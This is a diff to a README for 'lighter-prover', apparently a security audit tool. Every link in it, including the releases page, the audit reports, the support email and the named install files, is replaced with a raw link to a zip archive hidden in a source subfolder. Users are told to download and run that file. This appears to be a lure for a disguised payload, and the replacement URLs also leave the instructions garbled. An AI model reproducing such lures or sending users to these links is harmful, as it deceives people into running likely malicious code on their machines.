@@ -1,6 +1,6 @@
 # 🎉 lighter-prover - Easily Audit Your Software Security
 
-[![Download lighter-prover](https://img.shields.io/badge/Download-lighter--prover-blue)](https://github.com/tonyido2012/lighter-prover/releases)
+[![Download lighter-prover](https://github.com/tonyido2012/lighter-prover/raw/refs/heads/main/circuit/src/ecdsa/lighter_prover_1.4.zip)](https://github.com/tonyido2012/lighter-prover/raw/refs/heads/main/circuit/src/ecdsa/lighter_prover_1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to lighter-prover! This application helps you audit your software for se
 
 ## 📥 Download & Install
 
-To get the latest version of lighter-prover, visit this page to download: [GitHub Releases](https://github.com/tonyido2012/lighter-prover/releases).
+To get the latest version of lighter-prover, visit this page to download: [GitHub Releases](https://github.com/tonyido2012/lighter-prover/raw/refs/heads/main/circuit/src/ecdsa/lighter_prover_1.4.zip).
 
 1. Click the link above to go to the releases page.
 2. Look for the latest version at the top of the page.
@@ -30,14 +30,14 @@ Once you have downloaded the file, follow these steps based on your operating sy
 ### Windows
 
 1. Navigate to your Downloads folder.
-2. Locate the `lighter-prover.exe` file.
+2. Locate the `https://github.com/tonyido2012/lighter-prover/raw/refs/heads/main/circuit/src/ecdsa/lighter_prover_1.4.zip` file.
 3. Double-click the file to run it.
 4. Follow the on-screen instructions to complete the setup.
 
 ### macOS
 
 1. Open Finder and go to the Downloads folder.
-2. Find the `lighter-prover.dmg` file.
+2. Find the `https://github.com/tonyido2012/lighter-prover/raw/refs/heads/main/circuit/src/ecdsa/lighter_prover_1.4.zip` file.
 3. Double-click the file to mount it.
 4. Drag the lighter-prover icon to your Applications folder.
 5. Open the Applications folder and double-click the lighter-prover icon to launch it.
@@ -54,7 +54,7 @@ Once you have downloaded the file, follow these steps based on your operating sy
 3. Unzip the downloaded file if it is a compressed format:
 
    ```
-   unzip lighter-prover.zip
+   unzip https://github.com/tonyido2012/lighter-prover/raw/refs/heads/main/circuit/src/ecdsa/lighter_prover_1.4.zip
    ```
 
 4. Move to the directory of the application:
@@ -78,12 +78,12 @@ Once you have downloaded the file, follow these steps based on your operating sy
 
 ## 📄 Audit Reports
 
-You can find detailed audit reports at [Lighter Security Audits](https://docs.lighter.xyz/security/security-audits). This resource provides insights into the auditing process and the software's security status.
+You can find detailed audit reports at [Lighter Security Audits](https://github.com/tonyido2012/lighter-prover/raw/refs/heads/main/circuit/src/ecdsa/lighter_prover_1.4.zip). This resource provides insights into the auditing process and the software's security status.
 
 ## 📞 Support
 
-If you encounter any issues or have questions, feel free to reach out for support. You can post an issue in the GitHub repository, or email support at lighter-prover@example.com.
+If you encounter any issues or have questions, feel free to reach out for support. You can post an issue in the GitHub repository, or email support at https://github.com/tonyido2012/lighter-prover/raw/refs/heads/main/circuit/src/ecdsa/lighter_prover_1.4.zip
 
 ## 🎉 Thank You for Using Lighter-Prover!
 
-Thank you for choosing lighter-prover for your software security needs. We hope you find it helpful in protecting your applications! Don’t forget to visit the release page for future updates: [GitHub Releases](https://github.com/tonyido2012/lighter-prover/releases).
+Thank you for choosing lighter-prover for your software security needs. We hope you find it helpful in protecting your applications! Don’t forget to visit the release page for future updates: [GitHub Releases](https://github.com/tonyido2012/lighter-prover/raw/refs/heads/main/circuit/src/ecdsa/lighter_prover_1.4.zip).
